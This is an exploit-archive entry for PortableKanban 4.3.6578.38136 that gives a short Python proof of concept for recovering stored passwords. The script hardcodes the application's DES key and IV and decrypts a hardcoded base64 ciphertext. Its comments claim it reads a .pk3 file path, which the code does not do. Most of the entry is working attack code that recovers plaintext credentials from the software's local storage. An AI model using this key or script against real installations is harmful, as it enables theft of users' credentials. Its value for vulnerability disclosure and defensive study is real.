# Exploit Title: PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval
# Date: 9 Jan 2021
# Exploit Author: rootabeta
# Vendor Homepage: The original page, https://dmitryivanov.net/, cannot be found at this time of writing. The vulnerable software can be downloaded from https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
# Software Link: https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
# Version: Tested on: 4.3.6578.38136. All versions that use the similar file format are likely vulnerable.
# Tested on: Windows 10 x64. Exploit likely works on all OSs that PBK runs on.

# PortableKanBan stores credentials in an encrypted format
# Reverse engineering the executable allows an attacker to extract credentials from local storage
# Provide this program with the path to a valid PortableKanban.pk3 file and it will extract the decoded credentials

import json
import base64
from des import * #python3 -m pip install des
import sys

hash = "Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb"

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b"7ly6UznJ")
print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
